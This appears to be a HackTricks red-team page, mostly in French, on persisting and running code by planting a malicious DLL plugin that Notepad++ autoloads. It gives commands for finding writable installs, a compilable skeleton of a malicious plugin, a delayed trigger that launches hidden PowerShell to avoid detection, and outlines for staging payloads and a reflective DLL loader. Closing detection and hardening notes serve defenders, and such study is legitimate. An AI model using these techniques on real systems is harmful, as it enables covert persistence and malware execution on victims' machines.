# Notepad++ Plugin Autoload Persistence & Execution

{{#include ../../banners/hacktricks-training.md}}

Notepad++ va **autoload chaque DLL de plugin trouvée dans ses sous-dossiers `plugins`** au lancement. Déposer un plugin malveillant dans toute **installation Notepad++ inscriptible** donne une exécution de code dans `notepad++.exe` à chaque démarrage de l’éditeur, ce qui peut être abusé pour la **persistence**, une **initial execution** discrète, ou comme **in-process loader** si l’éditeur est lancé en élevé.

Depuis **Notepad++ 7.6+** la disposition attendue pour l’installation manuelle est **un sous-dossier par plugin** (`plugins\<PluginName>\<PluginName>.dll`). En **portable mode** (présence de `doLocalConf.xml` à côté de `notepad++.exe`), toute l’arborescence de l’application reste locale à ce répertoire, ce qui transforme souvent des bundles copiés/admin tool en une surface d’exécution facilement inscriptible par l’utilisateur.

## Writable plugin locations
- Installation standard : `C:\Program Files\Notepad++\plugins\<PluginName>\<PluginName>.dll` (nécessite généralement admin pour écrire).
- Options inscriptibles pour les opérateurs à faible privilège :
- Utiliser la **portable Notepad++ build** dans un dossier inscriptible par l’utilisateur.
- Copier `C:\Program Files\Notepad++` vers un chemin contrôlé par l’utilisateur (par ex. `%LOCALAPPDATA%\npp\`) et exécuter `notepad++.exe` depuis là.
- Chercher des **admin tool bundles**, des copies de zip extraits, ou des help-desk toolkits qui contiennent déjà `doLocalConf.xml` et se trouvent en dehors de `Program Files`.
- Chaque plugin obtient son propre sous-dossier sous `plugins` et est chargé automatiquement au démarrage ; les entrées de menu apparaissent sous **Plugins**.

Quick triage:
```cmd
where /r C:\ notepad++.exe 2>nul
for /d %D in ("%ProgramFiles%\Notepad++" "%ProgramFiles(x86)%\Notepad++" "%LOCALAPPDATA%\*notepad*" "%USERPROFILE%\Desktop\*notepad*") do @if exist "%~fD\plugins" echo [*] %~fD
icacls "C:\Program Files\Notepad++\plugins" 2>nul
```
## Points de chargement du plugin (primitives d’exécution)
Notepad++ attend des **fonctions exportées** spécifiques. Elles sont toutes appelées pendant l’initialisation, ce qui offre plusieurs surfaces d’exécution :
- **`DllMain`** — s’exécute immédiatement au chargement du DLL (premier point d’exécution).
- **`setInfo(NppData)`** — appelée une fois au chargement pour fournir les handles Notepad++; endroit habituel pour enregistrer des éléments de menu.
- **`getName()`** — retourne le nom du plugin affiché dans le menu.
- **`getFuncsArray(int *nbF)`** — retourne les commandes de menu ; même si elle est vide, elle est appelée pendant le démarrage.
- **`beNotified(SCNotification*)`** — reçoit les événements Notepad++ / Scintilla (utile pour différer les payloads jusqu’à une action de l’utilisateur ou un événement de l’éditeur).
- **`messageProc(UINT, WPARAM, LPARAM)`** — gestionnaire de messages, utile pour des échanges de données plus volumineux.
- **`isUnicode()`** — indicateur de compatibilité vérifié au chargement.

La plupart des exports peuvent être implémentés comme des **stubs** ; l’exécution peut se faire depuis `DllMain` ou n’importe quel callback ci-dessus pendant l’autoload.

## Squelette minimal de plugin malveillant
Compilez un DLL avec les exports attendus et placez-le dans `plugins\\MyNewPlugin\\MyNewPlugin.dll` sous un dossier Notepad++ inscriptible :
```c
BOOL APIENTRY DllMain(HMODULE h, DWORD r, LPVOID) { if (r == DLL_PROCESS_ATTACH) MessageBox(NULL, TEXT("Hello from Notepad++"), TEXT("MyNewPlugin"), MB_OK); return TRUE; }
extern "C" __declspec(dllexport) void setInfo(NppData) {}
extern "C" __declspec(dllexport) const TCHAR *getName() { return TEXT("MyNewPlugin"); }
extern "C" __declspec(dllexport) FuncItem *getFuncsArray(int *nbF) { *nbF = 0; return NULL; }
extern "C" __declspec(dllexport) void beNotified(SCNotification *) {}
extern "C" __declspec(dllexport) LRESULT messageProc(UINT, WPARAM, LPARAM) { return TRUE; }
extern "C" __declspec(dllexport) BOOL isUnicode() { return TRUE; }
```
1. Build the DLL (Visual Studio/MinGW).
2. Create the plugin subfolder under `plugins` and drop the DLL inside.
3. Restart Notepad++; the DLL is loaded automatically, executing `DllMain` and subsequent callbacks.

## Low-noise trigger pattern via `beNotified`
For OPSEC, many payloads should **not** fire from `DllMain`. A quieter pattern is to let the plugin load cleanly, then execute only after a realistic editor event such as **startup complete**, **buffer activation**, or the **first typed character**.
```c
static bool fired = false;
extern "C" __declspec(dllexport) void beNotified(SCNotification *n) {
if (fired) return;
if (n->nmhdr.code == NPPN_READY ||
n->nmhdr.code == NPPN_BUFFERACTIVATED ||
n->nmhdr.code == SCN_CHARADDED) {
fired = true;
WinExec("powershell -w hidden -nop -c <payload>", SW_HIDE);
}
}
```
Cela correspond mieux à la recherche offensive publique qu’à un beacon `DllMain` bruyant : la DLL est toujours autoloaded au démarrage, mais l’action malveillante est retardée jusqu’à ce que Notepad++ paraisse réellement en cours d’utilisation.

## Using the plugin config directory as secondary storage
Notepad++ expose `NPPM_GETPLUGINSCONFIGDIR`, qui renvoie le **plugin configuration directory** de l’utilisateur courant. Un plugin malveillant peut s’en servir pour garder la DLL sur disque minimale tout en stockant une config chiffrée, des payloads staged, ou des fichiers de tasking dans un chemin qui se fond dans l’état normal du plugin.
```c
wchar_t cfg[MAX_PATH] = {0};
SendMessage(nppData._nppHandle, NPPM_GETPLUGINSCONFIGDIR, MAX_PATH, (LPARAM)cfg);
// Example result: %AppData%\Notepad++\plugins\config
```
Opérationnellement, ceci est utile lorsque vous voulez :
- un petit DLL bootstrap autoloaded ;
- du tasking par utilisateur sans retoucher à nouveau le binaire principal du plugin ;
- séparer le **autoload trigger** de la seconde étape plus lourde.

## Reflective loader plugin pattern
Un plugin weaponized peut transformer Notepad++ en **reflective DLL loader** :
- Présenter une interface minimale / entrée de menu (par ex. "LoadDLL").
- Accepter un **file path** ou une **URL** pour récupérer un payload DLL.
- Mapper reflective le DLL dans le processus actuel et invoquer un point d’entrée exporté (par ex. une fonction de loader à l’intérieur du DLL récupéré).
- Avantage : réutiliser un processus GUI d’apparence bénigne au lieu de lancer un nouveau loader ; le payload hérite de l’intégrité de `notepad++.exe` (y compris dans des contextes élevés).
- Inconvénients : déposer un **unsigned plugin DLL** sur le disque est bruyant ; une variation pratique consiste à utiliser le plugin autoloaded seulement comme stub et à conserver le véritable implant chiffré/staged ailleurs.

## Detection and hardening notes
- Bloquer ou monitor **writes to Notepad++ plugin directories** (y compris les copies portables dans les profils utilisateur) ; activer controlled folder access ou application allowlisting.
- Déclencher une alerte sur les **new unsigned DLLs** sous `plugins`, les modifications des arbres Notepad++ portables, et toute **child processes/network activity** inhabituelle depuis `notepad++.exe`.
- Établir un baseline des plugins légitimes et enquêter sur tout nouveau DLL qui exporte l’interface normale de plugin Notepad++ mais lance aussi des shells, PowerShell, ou des network beacons.
- Imposer l’installation des plugins via **Plugins Admin** uniquement, et restreindre l’exécution des copies portables depuis des chemins non fiables.

## References
- [TrustedSec - Notepad++ Plugins: Plug and Payload](https://trustedsec.com/blog/notepad-plugins-plug-and-payload)
- [Notepad++ User Manual - Plugins](https://npp-user-manual.org/docs/plugins/)
- [Notepad++ User Manual - Plugin Communication](https://npp-user-manual.org/docs/plugin-communication/)

{{#include ../../banners/hacktricks-training.md}}
